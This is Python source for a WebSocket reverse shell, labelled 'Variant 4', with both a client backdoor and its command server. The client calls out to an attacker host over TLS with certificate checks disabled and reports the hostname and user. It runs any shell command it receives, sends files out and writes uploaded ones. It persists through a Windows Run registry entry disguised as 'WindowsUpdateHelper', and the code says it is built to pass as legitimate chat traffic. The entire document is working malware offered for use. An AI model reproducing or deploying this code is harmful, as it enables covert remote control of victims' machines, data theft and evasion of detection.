'''VARIANT 4: WEBSOCKET REVERSE SHELL WITH TLS ENCRYPTION

Change from previous: Uses WebSocket protocol with TLS encryption - looks like secure chat/legitimate websocket traffic, fully encrypted.'''
#!/usr/bin/env python3
# WEBSOCKET TLS REVERSE SHELL - ENCRYPTED & DISGUISED

import asyncio
import websockets
import subprocess
import os
import platform
import base64
import json
import ssl
import time
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2

class WebSocketTLSBackdoor:
    def __init__(self, server_url, password="default_change_me"):
        self.server_url = server_url  # wss://your-server.com:8765
        self.websocket = None
        self.running = True
        self.connected = False
        
        # Generate encryption key from password
        salt = b'staticsalt123'  # In real use, negotiate salt
        kdf = PBKDF2(algorithm=hashes.SHA256(), length=32, salt=salt, iterations=100000)
        key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
        self.cipher = Fernet(key)
    
    def encrypt(self, data):
        """Encrypt data before sending"""
        return self.cipher.encrypt(data.encode())
    
    def decrypt(self, data):
        """Decrypt received data"""
        return self.cipher.decrypt(data).decode()
    
    async def connect(self):
        """Establish WebSocket connection with TLS"""
        while not self.connected:
            try:
                # SSL context for wss://
                ssl_context = ssl.create_default_context()
                ssl_context.check_hostname = False
                ssl_context.verify_mode = ssl.CERT_NONE
                
                self.websocket = await websockets.connect(
                    self.server_url,
                    ssl=ssl_context,
                    ping_interval=20,
                    ping_timeout=60
                )
                self.connected = True
                
                # Send system info
                sysinfo = {
                    "type": "connect",
                    "hostname": platform.node(),
                    "os": f"{platform.system()} {platform.release()}",
                    "user": os.getenv('USERNAME', os.getenv('USER', 'unknown'))
                }
                await self.websocket.send(self.encrypt(json.dumps(sysinfo)))
                
            except Exception as e:
                print(f"Connection failed: {e}, retrying...")
                await asyncio.sleep(5)
    
    async def execute_command(self, command):
        """Execute and return result"""
        try:
            if command.startswith('cd '):
                path = command[3:].strip()
                os.chdir(path)
                return f"Changed to: {os.getcwd()}"
            
            # Handle file upload/download
            if command.startswith('download '):
                filepath = command[9:].strip()
                if os.path.exists(filepath):
                    with open(filepath, 'rb') as f:
                        content = base64.b64encode(f.read()).decode()
                        return f"[FILE] {os.path.basename(filepath)}|{content}"
                return "[ERROR] File not found"
            
            if command.startswith('upload '):
                # Format: upload filename|base64data
                parts = command[7:].split('|', 1)
                if len(parts) == 2:
                    filename, data = parts
                    with open(filename, 'wb') as f:
                        f.write(base64.b64decode(data))
                    return f"[UPLOAD] {filename} saved"
            
            # Regular command execution
            process = await asyncio.create_subprocess_shell(
                command,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            stdout, stderr = await process.communicate()
            
            if stdout:
                return stdout.decode()
            if stderr:
                return f"ERROR: {stderr.decode()}"
            return "[OK] Command executed"
            
        except Exception as e:
            return f"Execution error: {str(e)}"
    
    async def handle_messages(self):
        """Process incoming commands"""
        try:
            async for message in self.websocket:
                try:
                    # Decrypt command
                    cmd_data = self.decrypt(message)
                    cmd = json.loads(cmd_data)
                    
                    if cmd['type'] == 'command':
                        # Execute and send response
                        result = await self.execute_command(cmd['data'])
                        response = {
                            "type": "result",
                            "id": cmd.get('id', 0),
                            "data": result
                        }
                        await self.websocket.send(self.encrypt(json.dumps(response)))
                    
                    elif cmd['type'] == 'ping':
                        await self.websocket.send(self.encrypt(json.dumps({"type": "pong"})))
                        
                except Exception as e:
                    # Send error
                    error_response = {
                        "type": "error",
                        "data": str(e)
                    }
                    await self.websocket.send(self.encrypt(json.dumps(error_response)))
                    
        except websockets.exceptions.ConnectionClosed:
            self.connected = False
        except Exception as e:
            print(f"Message handling error: {e}")
            self.connected = False
    
    async def persistence_check(self):
        """Maintain connection and reconnection"""
        while self.running:
            if not self.connected:
                await self.connect()
            
            if self.connected:
                await self.handle_messages()
            
            await asyncio.sleep(1)
    
    def run(self):
        """Start the backdoor"""
        asyncio.run(self.persistence_check())

if __name__ == "__main__":
    SERVER = "wss://your-server.com:8765"  # CHANGE THIS
    PASSWORD = "supersecretkey123"          # CHANGE THIS
    
    # Auto-start with Windows (optional)
    if platform.system() == "Windows":
        import winreg
        try:
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                script_path = os.path.abspath(__file__)
                winreg.SetValueEx(regkey, "WindowsUpdateHelper", 0, winreg.REG_SZ, f'python "{script_path}"')
        except:
            pass
    
    backdoor = WebSocketTLSBackdoor(SERVER, PASSWORD)
    backdoor.run()


#websocket tls server
#!/usr/bin/env python3
# WEBSOCKET TLS COMMAND SERVER

import asyncio
import websockets
import ssl
import json
import base64
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2

class CommandServer:
    def __init__(self, password="supersecretkey123"):
        # Setup encryption same as client
        salt = b'staticsalt123'
        kdf = PBKDF2(algorithm=hashes.SHA256(), length=32, salt=salt, iterations=100000)
        key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
        self.cipher = Fernet(key)
        self.clients = set()
        self.cmd_id = 0
    
    def encrypt(self, data):
        return self.cipher.encrypt(data.encode())
    
    def decrypt(self, data):
        return self.cipher.decrypt(data).decode()
    
    async def command_loop(self):
        """Interactive command input"""
        while True:
            if not self.clients:
                print("[*] Waiting for clients...")
                await asyncio.sleep(2)
                continue
            
            cmd = input("\nEnter command (or 'list' for clients): ")
            
            if cmd.lower() == 'list':
                for i, client in enumerate(self.clients):
                    print(f"[{i}] {client.remote_address}")
                continue
            
            if cmd.lower() == 'exit':
                break
            
            if self.clients:
                # Send to first connected client
                client = next(iter(self.clients))
                self.cmd_id += 1
                command_msg = json.dumps({
                    "type": "command",
                    "id": self.cmd_id,
                    "data": cmd
                })
                await client.send(self.encrypt(command_msg))
    
    async def handler(self, websocket):
        """Handle incoming connections"""
        self.clients.add(websocket)
        try:
            async for message in websocket:
                try:
                    data = self.decrypt(message)
                    msg = json.loads(data)
                    
                    if msg['type'] == 'connect':
                        print(f"\n[+] New target: {msg}")
                    elif msg['type'] == 'result':
                        print(f"\n[Result {msg['id']}]:\n{msg['data']}")
                    elif msg['type'] == 'pong':
                        pass  # Keepalive
                        
                except Exception as e:
                    print(f"Error: {e}")
                    
        finally:
            self.clients.remove(websocket)
    
    async def main(self):
        """Start server"""
        # Generate self-signed cert for testing
        # In production, use real certificates
        ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        ssl_context.load_cert_chain('server.crt', 'server.key')  # Generate these
        
        async with websockets.serve(
            self.handler, 
            "0.0.0.0", 
            8765, 
            ssl=ssl_context,
            ping_interval=20,
            ping_timeout=60
        ):
            print("[*] WSS Server running on wss://0.0.0.0:8765")
            await self.command_loop()

if __name__ == "__main__":
    server = CommandServer()
    asyncio.run(server.main())